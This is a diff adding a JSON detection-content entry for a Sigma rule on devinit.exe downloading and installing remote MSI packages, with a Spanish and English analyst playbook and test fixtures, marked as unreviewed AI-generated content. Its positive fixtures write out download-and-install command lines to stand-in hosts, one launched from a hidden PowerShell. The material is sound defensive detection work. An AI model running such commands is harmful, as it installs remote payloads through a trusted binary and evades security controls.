@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "90d50722-0483-4065-8e35-57efaadd354d",
+    "title": "Arbitrary MSI Download Via Devinit.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó devinit.exe con los parámetros '-t msi-install' e '-i http', lo que indica la descarga e instalación de un paquete MSI desde una URL remota. Puede tratarse de abuso de un binario firmado de Microsoft (LOLBIN) para introducir software arbitrario.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene a la vez ' -t msi-install ' y ' -i http'. Corresponde a la herramienta msi-install de devinit.exe, la utilidad de Visual Studio para inicializar entornos de desarrollo, apuntando a un MSI alojado en un servidor HTTP o HTTPS.",
+      "why_it_matters": "Un atacante puede usar devinit.exe, un binario legítimo y firmado, para descargar e instalar un MSI malicioso y evadir controles que confían en ejecutables de Microsoft. Corresponde a ATT&CK T1218 (System Binary Proxy Execution): ejecución por medio de binarios del sistema.",
+      "triage_steps": [
+        "Revise el CommandLine completo: extraiga la URL que sigue a '-i', su dominio y el nombre del MSI. Verifique si el dominio es interno, de un proveedor conocido o desconocido.",
+        "Confirme la ruta de Image: devinit.exe legítimo suele estar dentro de una instalación de Visual Studio. Una copia en carpetas de usuario o temporales es sospechosa.",
+        "Analice ParentImage y la cadena de procesos padre: cmd.exe, powershell.exe, wscript.exe o aplicaciones de Office son más sospechosos que el IDE de Visual Studio.",
+        "Valide el usuario: ¿es desarrollador y el host es una estación de desarrollo? Consulte con el usuario o con su responsable.",
+        "Busque procesos hijos (msiexec.exe y lo que este lance) y archivos .msi creados en el mismo host dentro de +/- 15 minutos.",
+        "Revise conexiones de red y DNS hacia el dominio de la URL, y busque ese dominio en otros hosts y en alertas previas.",
+        "Consulte el registro Application (eventos de MsiInstaller) para identificar el producto instalado y obtenga el hash del MSI para buscarlo en inteligencia de amenazas."
+      ],
+      "false_positives": [
+        "La regla indica falsos positivos desconocidos; aun así, desarrolladores pueden usar devinit para instalar dependencias MSI desde URLs oficiales de proveedores.",
+        "Scripts de aprovisionamiento de estaciones de desarrollo o pipelines de CI que descargan instaladores desde un repositorio interno de artefactos."
+      ],
+      "response_steps": [
+        "Verifique la legitimidad de la URL y del MSI con el usuario y el equipo de desarrollo antes de actuar.",
+        "Si es malicioso, aísle el endpoint y bloquee el dominio o la IP de descarga en proxy y firewall.",
+        "Conserve el MSI y los artefactos para análisis; desinstale el producto y elimine la persistencia creada por el paquete.",
+        "Busque la misma URL, hash o línea de comandos en toda la flota y restablezca las credenciales del usuario si hubo compromiso.",
+        "Si es legítimo, documente la excepción acotada por host, usuario y dominio de descarga."
+      ],
+      "severity_rationale": "Nivel medio: la combinación de parámetros es poco común y permite instalar software remoto con un binario de confianza, pero devinit tiene usos legítimos de desarrollo."
+    },
+    "en": {
+      "summary": "devinit.exe ran with '-t msi-install' and '-i http', meaning it downloaded and installed an MSI package from a remote URL. This may be abuse of a signed Microsoft binary (LOLBIN) to deliver arbitrary software.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains both ' -t msi-install ' and ' -i http'. This is the msi-install tool of devinit.exe, the Visual Studio development environment initialization utility, pointed at an MSI hosted on an HTTP or HTTPS server.",
+      "why_it_matters": "Attackers can use devinit.exe, a legitimate signed binary, to fetch and install a malicious MSI while bypassing controls that trust Microsoft executables. This maps to ATT&CK T1218, System Binary Proxy Execution.",
+      "triage_steps": [
+        "Read the full CommandLine: extract the URL after '-i', its domain and the MSI name. Decide whether the domain is internal, a known vendor or unknown.",
+        "Check the Image path: legitimate devinit.exe normally sits inside a Visual Studio installation. A copy in user or temp folders is suspicious.",
+        "Review ParentImage and the parent chain: cmd.exe, powershell.exe, wscript.exe or Office apps are more suspicious than the Visual Studio IDE.",
+        "Validate the user: are they a developer on a development workstation? Confirm with the user or their manager.",
+        "Look for child processes (msiexec.exe and its children) and .msi files created on the same host within +/- 15 minutes.",
+        "Review network and DNS activity to the URL's domain, and search for that domain on other hosts and in earlier alerts.",
+        "Check the Application log (MsiInstaller events) to identify the installed product, and hash the MSI for threat intelligence lookups."
+      ],
+      "false_positives": [
+        "The rule lists false positives as unknown; still, developers may use devinit to install MSI dependencies from official vendor URLs.",
+        "Developer workstation provisioning scripts or CI pipelines pulling installers from an internal artifact repository."
+      ],
+      "response_steps": [
+        "Verify the URL and MSI with the user and development team before acting.",
+        "If malicious, isolate the endpoint and block the download domain or IP at the proxy and firewall.",
+        "Preserve the MSI and artifacts; uninstall the product and remove any persistence the package created.",
+        "Hunt for the same URL, hash or command line fleet-wide, and reset the user's credentials if compromise is confirmed.",
+        "If legitimate, document a narrow exception scoped to host, user and download domain."
+      ],
+      "severity_rationale": "Medium fits because this flag combination is uncommon and installs remote software via a trusted binary, yet devinit has legitimate development uses."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "devinit.exe launched from PowerShell downloads and installs an MSI from a remote HTTPS URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\Tools\\devinit\\devinit.exe",
+          "CommandLine": "devinit.exe run -t msi-install -i https://downloads.example.org/update/agent.msi",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden",
+          "ProcessId": 6120
+        }
+      },
+      {
+        "description": "Copy of devinit.exe in a temp folder installing an MSI over plain HTTP from a documentation IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\devinit.exe",
+          "CommandLine": "\"C:\\Users\\mrojas\\AppData\\Local\\Temp\\devinit.exe\" run -t msi-install -i http://203.0.113.45/pkg.msi",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ProcessId": 4388
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Developer uses devinit msi-install with a local MSI path, so ' -i http' is absent",
+        "event": {
+          "EventID": 1,
+          "Computer": "DEV-0031.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\Tools\\devinit\\devinit.exe",
+          "CommandLine": "devinit.exe run -t msi-install -i C:\\Packages\\sqllocaldb.msi",
+          "ParentImage": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\IDE\\devenv.exe",
+          "ProcessId": 7712
+        }
+      },
+      {
+        "description": "Standard devinit init using a .devinit.json file, no msi-install tool on the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "DEV-0031.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\Tools\\devinit\\devinit.exe",
+          "CommandLine": "devinit.exe init -f C:\\src\\webapp\\.devinit.json",
+          "ParentImage": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\Common7\\IDE\\devenv.exe",
+          "ProcessId": 7840
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
